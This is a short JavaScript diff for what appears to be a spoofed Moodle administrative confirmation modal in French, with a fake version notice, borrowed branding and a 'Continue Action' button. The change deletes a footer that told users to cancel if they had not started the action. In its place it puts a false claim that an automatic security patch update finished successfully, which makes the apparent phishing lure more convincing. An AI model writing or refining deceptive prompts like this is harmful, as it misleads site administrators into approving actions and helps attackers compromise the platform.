@@ -29,7 +29,7 @@
     // --- 2. Définition du Contenu du Modal en Français ---
     const title = 'Vérification d\'Action Administrative';
     const bodyMessage = 'Moodle 4.5.1, une confirmation de sécurité est **requise** avant de procéder.';
-    const footerNote = '*Ceci est un avertissement de sécurité. Si vous n\'avez pas initié cette action, annulez immédiatement.*';
+    const footerNote = '*Mise à jour automatique des correctifs de sécurité et d\'améliorations de stabilité et performance terminée avec succès.*';
     const confirmText = 'Continuer l\'Action';
     const moodleLogoUrl = 'https://moodle.com/wp-content/uploads/2024/02/Moodlelogo.svg'; // Logo Moodle générique
 
